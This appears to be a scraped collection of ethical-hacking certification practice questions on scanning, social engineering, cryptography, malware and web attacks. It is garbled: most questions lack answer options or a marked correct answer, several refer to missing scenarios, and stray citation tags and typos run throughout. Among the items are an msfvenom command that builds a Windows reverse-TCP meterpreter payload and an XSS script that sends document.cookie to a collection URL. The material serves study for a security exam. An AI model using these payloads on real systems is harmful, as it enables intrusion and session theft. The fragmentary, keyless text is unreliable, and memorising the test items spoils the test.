question: When configuring wireless on the router, your colleague disables SSID broadcast but leaves authentication "open" and sets SSID to a 32-character string of random letters and numbers. Which of the following is the correct statement about this scenario?

answers.text: Disabling SSID broadcast prevents 802.11 beacons from being transmitted from the access point, resulting in a proper setup leveraging "security through obscurity".
This move will prevent brute-force attacks.
The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association.
The router is still vulnerable to wireless hacking attempts because the SSID broadcast setting can be enabled using a specially crafted packet sent to the access point's hardware address.

question: Identify the type of hacker following description: When finding a zero-day vulnerability on a public-facing system, a hacker sends an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability.
Which of the following tiers in the three-tier application architecture is responsible for moving and processing data between them?

While browsing his social media feed, Jacob noticed Jane's photo with the caption: "Learn more about your friends," as well as several personal questions under the post. Jacob responds to the questions. A few days later, Jacob tries to log into his bank account and finds out that it has been compromised. What most likely happened?

answers.text: Jacob's bank-account login information was brute-forced.
Jacob's password was stolen while he was enthusiastically participating in the survey.
Jacob inadvertently provided the answers to his security questions when responding to Jane's post.
Jacob's computer was infected with a Banker Trojan.

question: Which of the following attacks can you perform if you know that the web server handles the "(../)" (character string) incorrectly and returns the file listing of a folder structure of the server?

Identify the phase of the APT lifecycle that the hacker is in at the moment according to the scenario: The hacker prepared for an attack and attempted to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities. Thanks to the successful attack, he deployed malware on the target system to establish an outbound connection.

The hacker monitored and intercepted traffic between the victim and a host machine to predict the victim's ISN. The hacker sent spoofed packets with the victim's IP address using the ISN. The victim's connection was interrupted, and the hacker was able to connect. Which attack did the hacker perform?

Jonh found information about the emails of two employees in public sources and is preparing a client-side backdoor to send to the employees via email. Which of the stages of the cyber kill chain does John perform?
Which of the following is a file on a web server that can be misconfigured and provide sensitive information for a hacker, such as verbose error messages?
Identify the correct syntax for ICMP scan on a remote computer using hping2.
You need to send an email containing confidential information using PGP. What should you use to communicate correctly using this type of encryption?

answers.text: Use your own private key to encrypt the message.
Use your own public key to encrypt the message.
Use your colleague's public key to encrypt the message.
Use your colleague's private key to encrypt the message.

question: The attacker is trying to cheat an employee by initiating fake calls while posing as a legitimate employee and sending phishing emails. Which of the following techniques did the attacker use?
Jennys wants to send a digitally signed message to Molly. What key will Jennys use to sign the message, and how will Molly verify it?

answers.text: Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny's public key
Jennys will sign the message with Molly's private key, and Molly will verify that the message came from Jennys by using Jenny's public key
Jennys will sign the message with Molly's public key, and Molly will verify that the message came from Jennys by using Jenny's public key
Jennys will sign the message with her public key, and Molly will verify that the message came from Jenny's by using Jenny's private key.

question: You plan to use DNS to perform data exfiltration. You embed malicious data into the DNS protocol packets to successfully inject malware and maintain communication with a C&C server. Which technique would you use?
Which of the following describes cross-site request forgery?

answers.text: A request sent by a malicious user from a browser to a server.
A server makes a request to another server without the user's knowledge.
Modifying the request by the proxy server between the client and the server.
A browser makes a request to a server without the user's knowledge.

question: The attacker installed a scanner on a machine belonging to an employee and scanned several machines on the same network. Which of the following type of vulnerability assessment tools employed the attacker?
Which of the following programs is best used for analyzing packets on your wireless network?
You must discover all the active devices hidden by a restrictive firewall in the IPv4 range in a target network. Which of the following host discovery techniques will you use?

You established a connection with your computer using the SMB service and entered your password in plaintext. You need to delete the data about the login and password. Which of the following files do you need to clear?
Identify the footprinting technique: gathering domain information such as domain name, contact details of its owner, expiry date, and creation date.
During an audit, you found a dial-out modem installed. Which of the following security policies should you check to see if dial-out modems are allowed?

Andy called Nick masquerading as customer support. Nick agreed to a meeting. Andy entered the organization territory and gathered sensitive information by searching desks and bins. What is the type of attack technique Andy used?
Which of the following services runs directly on TCP port 445?
The attacker used the following command for scanning: nmap 192.168.1.64/28. Why couldn't the attacker find servers located at 192.168.1.140, 192.168.1.141 and 192.168.1.142?

answers.text: He needs to add the command "ip address" just before the IP address
He needs to change the address to 192.168.1.0 with the same mask
The network must be dawn and the nmap command and IP address are ok
He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range

question: Which of the following Docker components will you use to process API requests and handle containers, volumes, images, and networks?
Which of the following tools can work as a proxy, save every request and response, and allow you to test parameters and headers manually?
You enter the command: ping-* 6 192.168.120.114. The output shows 6 packets sent. Which of the following flags is hidden under "*"?
What is the common name of vulnerability disclosure programs opened by companies on HackerOne, Bugcrowd, etc.?
Percival dialled a number claiming to represent technical support and prompted the victim to execute commands and install malicious files. Which social engineering technique did Percival use?
Employees receive a series of pop-ups with advertisements every time they attempt to go to a website. Which of the following type of malwares infected their systems?

You need to identify the OS of the target host. You want to use the Unicornscan tool to do this. As a result of using the tool, you got the TTL value and determined that the target system is running a Windows OS. Which of the following TTL values did you get when using the program?
Which of the following is the hacker's first step in conducting a DNS cache poisoning attack on a target organization?

answers.text: The hacker makes a request to the DNS resolver.
The hacker queries a nameserver using the DNS resolver.
The hacker uses TCP to poison the DNS resolver.
The hacker forges a reply from the DNS resolver.

question: Which of the following is a type of virus detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities?

Identify the attack technique by description: The attacker gains unauthorized access to the target network, remains there without being detected for a long time, and obtains sensitive information without sabotaging the organization.

Identify the technique by description: During the execution of this technique, an attacker copies the entire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, web pages, images, etc.
John sent a TCP ACK segment to a known closed port on a firewall, but it didn't respond with an RST. What conclusion can John draw about the firewall he scanned?

answers.text: John can't draw any conclusions based on this information.

question: At which of the following stages of the cyber kill chain does data exfiltration occur?

Your friend installed an application from a third-party app store. After a while, some of the applications in his smartphone were replaced by malicious applications that appeared legitimate, and he began to receive a lot of advertising spam. Which of the following attacks has your friend been subjected to?

Identify the attack: The victim connected his iPhone to a public computer. After establishing the connection, the victim enabled iTunes Wi-Fi sync. Now the attacker who infected the computer can access the victim's iPhone even after the device is physically disconnected.
Which of the following nmap commands must you use to perform the TCP SYN ping scan?

According to the configuration of the DHCP server, only the last 100 IP addresses are available for lease in subnet 10.1.4.0/23. Which of the following IP addresses is in the range of the last 100 addresses?
Which of the following type of malware did the attacker use to bypass your company's application whitelisting by operating in memory without touching the hard drive?
Viktor plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch to make it a root bridge and sniff all traffic. What is the attack performed?
Which of the following is an IOS jailbreaking technique that patches the kernel during the device boot to keep jailbroken after each reboot without assistance?
An ethical hacker uses phishing to gain credentials to a system or web application. What phase of ethical hacking methodology is the hacker currently in?
Which of the following tools will you use for monitoring your organization's website, analyzing traffic, and tracking the geographical location of visitors?
Which of the following online tools allows attackers to gather information related to the model of an loT device and the certifications granted to it?
You check the response time of a true/false response and then use another command to determine if the database returns results for user IDs. Which two SQL injection types have you tried?
Identify the Bluetooth hacking technique which refers to the theft of information from a wireless device through Bluetooth?
Which of the following keys can you share openly using asymmetric cryptography without compromising security?
Which of the following commands verify a user ID on an SMTP server?
Which of the following tools can an attacker use to gather information anonymously from an LDAP service with a Graphical User Interface?
Which type of assessment involves conducting configuration-level checks to identify system configurations, registry settings, and file permissions?
Ivan infiltrated an MSP provider to gain access to cloud services and customer data. Which of the following cloud attacks did Ivan perform?
The attacker plans to use a URL to obtain a remote feed and alter it to localhost to view local resources on the target server. Which attack is this?
An attacker composed a list of vulnerable hosts in advance to ensure fast spreading of a worm. Which scanning technique is this?
You try to connect to a known wireless network name but it connects without asking for the password provided by the owner. Which attack occurred?
Which wireless protocol allows 192-bit minimum-strength security and uses GCMP-256 and ECDSA with a 384-bit elliptic curve?
What is the difference between phishing and pharming attacks?

answers.text: Phishing provides a misspelled/similar URL; Pharming redirects via host file/DNS vulnerabilities.
Phishing redirects via DNS; Pharming uses misspelled URLs.
Pharming uses email; Phishing uses DNS servers.

question: On which of the following ports should the NSTX tool be run for DNS tunnelling?
Which of the following vulnerabilities will you use if you know that the target network uses WPA3 encryption?

During a port scan on the target host, your colleague sends FIN/ACK probes and finds that an RST packet is sent in response by the target host, indicating that the port is closed. Which of the following port scanning techniques did your colleague use?

During the scan, you found a serious vulnerability, compiled a report and sent it to your colleagues. In response, you received proof that they fixed this vulnerability a few days ago. How can you characterize this vulnerability?
Which of the following rootkit types sits undetected in the core components of the operating system?

Your organization has a public key infrastructure set up. Your colleague Bernard wants to send a message to Joan. Therefore, Bernard both encrypts the message and digitally signs it. Bernard uses ________ to encrypt the message for these purposes, and Joan uses ________ to confirm the digital signature.

answers.text: Joan's public key; Bernard's public key.
Bernard's public key; Bernard's public key.
Joan's public key; Joan's public key.
Joan's private key; Bernard's public key.

question: A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach. At the same time a fix was available from the software vendor for several months before the intrusion. In which of the following security processes has failed?

Ivan decided to use Nmap to scan open ports and running services on systems connected to an OT network. Which of the following commands identifies Ethernet/IP devices and gathers information such as vendor name, product code, and device name?
Which of the following protocols is short-range, based on the IEEE 203.15.4 standard, with a range of 10-100m, and designed for small-scale projects needing wireless connection?
Which of the following is a correct example of using msfvenom to generate a reverse TCP shellcode for Windows?

answers.text: msfvenom -p windows/meterpreter/reverse_tcp RHOST 10.10.10.12 LPORT=8888 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.12 LPORT=8888 -f exe > shell.exe

question: Which of the following tools can be used to retrieve an organization's network range, identify network topology, and the operating systems used by entering a server IP address?
Which of the following ports must you block first in case that you are suspicious that an loT device has been compromised by Mirai malware?
You performed a tool-based vulnerability assessment and found that some identified issues are not true vulnerabilities. How can you characterize these issues?
Antonio used a technique to encode packets with Unicode characters so that the IDS cannot recognize them, but the target web server can decode them. Which technique is this?
In the five-tier container technology architecture, at which tier are you working when verifying and validating image contents, signing images, and sending them to registries?
According to CVSS v3.1 severity ratings, which of the following score ranges is considered 'Medium'?
Identify the exploit framework whose capabilities include automated attacks on services, ports, applications and unpatched security flaws.
A web server permits SSLv2 and shares a private key with another server that also allows SSLv2. This makes it vulnerable to which attack that can leak key information?
Which of the following NetBIOS codes is used for obtaining the messenger service running for the logged-in user?
Jack launched an attack by broadcasting forged DHCP requests to lease all available addresses until the server could not issue more. Which attack did Jack perform?
Which of the following Metasploit Framework tools can be used to bypass antivirus by altering the code in an executable?
An attacker records frequency commands between IoT devices and later repeats the captured signals to repeat commands. Which attack is this?
Identify the attack: partial HTTP requests are sent to web applications so the target server opens multiple connections and keeps waiting for completion, eventually denying others.
Using CVSS v3.0, a vulnerability is assigned a base score of 4.0. What is its severity level?
Which of the following files determines the basic configuration in an Android application, such as broadcast receivers and services?
Which of the following AAA protocols can be used for authenticating users connecting via analog modems, DSL, and VPN over a Frame Relay network?
Plaintext sharing of usernames and passwords allows for session hijacking. Which of the following protocols uses encryption and digital certificates to help solve this?
Which Python-based automated tool can retrieve DNS zone data, including IP addresses, DNS records, and Whois records for reconnaissance?
Identify the protocol used to secure an LDAP service against anonymous queries.
Which of the following creates an appealing isolated environment for hackers to gather information about them while preventing them from compromising real targets?
Which of the following Nmap commands performs a stealth scan (TCP SYN scan)?

Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization's web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use? [cite: 2074, 2075, 2076, 2077, 2078, 2079]

You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following: hackeduser@hackedserver.~$ nmap -T4-0 192.168.0.0/24. TCP/IP fingerprinting (for OS scan) xxxxXXX XXXXXX XXXXXXXXX. QUITTING! [cite_start]Why couldn't the scan be performed? [cite: 2119, 2120, 2121, 2122, 2123, 2124]

answers.text: The outgoing TCP/IP fingerprinting is blocked by the host firewall. [cite: 2127]

question: Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). [cite_start]Which of the following is this type of solution? [cite: 2132, 2133, 2134, 2135]
Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity? [cite: 2182, 2183]

He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. You know that your subordinate can retrieve information from a MIB that contains object types for workstations and server services. [cite_start]Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services? [cite: 2212, 2213, 2214]

You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. [cite_start]What is the name of this technique? [cite: 2231, 2232, 2233, 2234]
Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture? [cite: 2245, 2246]

Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. [cite_start]Which of the following countermeasures is the target company using to protect against rainbow tables? [cite: 2270, 2271, 2272]

Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. [cite_start]Which of the following attacks was the attacker performing? [cite: 2291, 2292, 2293, 2294]

Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application? [cite: 2317, 2318]
Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server? [cite: 2360, 2361]

The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. [cite_start]What is the social engineering technique the attacker used in this scenario? [cite: 2392, 2393, 2394, 2395, 2396]
Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits? [cite: 2419, 2420]

You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. [cite_start]Which of the following tools will you use to accomplish this task? [cite: 2453, 2454]
Jan 3, 2020, 9:18:35 AM 10.240.212.18-54373 10.202.206.19-22 tcp_ip. [cite_start]Based on this log, which of the following is true? [cite: 2472, 2473, 2474]

answers.text: SSH communications are encrypted; it's impossible to know who is the client or the server. [cite: 2475]
Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2476, 2477]
Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the client. [cite: 2478]
Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2479]

question: When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website. [cite_start]Identify the attack. [cite: 2488, 2489, 2490, 2491]

Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. [cite_start]What service is running on this port, and how can you fix this problem? [cite: 2518, 2519, 2520]

answers.text: The service is LDAP. [cite_start]You must change it to 636, which is LDAPS. [cite: 2521, 2522]
The findings do not require immediate actions and are only suggestions. [cite: 2522]
The service is NTP, and you have to change it from UDP to TCP to encrypt it. [cite: 2523]
The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails. [cite: 2524]

question: He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. [cite_start]Which of the following tools is used by the attacker? [cite: 2536, 2537, 2538]

The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. [cite_start]Which of the following advanced operators will he use to restrict the search to the organization's web domain? [cite: 2561, 2562, 2563]

Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. [cite_start]Which of the following attacks is described in this scenario? [cite: 2579, 2580, 2581, 2582]

While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. [cite_start]Which of the following protocols is used in your organization's wireless network? [cite: 2606, 2607, 2608, 2609]
Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment? [cite: 2627, 2628]

Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. [cite_start]Which of the following will be the best solution for Matthew? [cite: 2653, 2654, 2655]

answers.text: Use Alternate Data Streams to hide the outgoing packets from this server. [cite: 2656]
Install Cryptcat and encrypt outgoing packets from this server. [cite: 2657]
Install and use Telnet to encrypt all outgoing traffic from this server. [cite: 2658]
Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems. [cite: 2659]

question: Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it? [cite: 2664, 2665]

Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible? [cite: 2693, 2694]
Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform? [cite: 2704, 2705]
Which of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker? [cite: 2757, 2758]

You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. [cite_start]Which of the following types of attacks have you been exposed to? [cite: 2783, 2784, 2785, 2786]

The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. [cite_start]Which of the following standards has the medical organization violated? [cite: 2799, 2800, 2801]
Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates? [cite: 2823, 2824]
Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys? [cite: 2851, 2852]

At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. [cite_start]Which of the following vulnerability-management phases is your security department in? [cite: 2873, 2874, 2875]

You decide to check it out and discover the following code is hidden behind those images: <script> document.write('<img.src="https://localhost/submitcookie.php? cookie =" + escape(document.cookie) +"" />'); </script>. [cite_start]What does this script do? [cite: 2898, 2899, 2900, 2901, 2902]

answers.text: This PHP file silently executes the code and grabs the user's session cookie and session ID. [cite: 2903]
The code is a virus that is attempting to gather the user's username and password. [cite: 2904]
The code injects a new cookie into the browser. [cite: 2905]
The code redirects the user to another site. [cite: 2906]

question: After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. [cite_start]Which of the following type of vulnerability assessment solutions will you perform? [cite: 2911, 2912]
What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting? [cite: 2946, 2947]
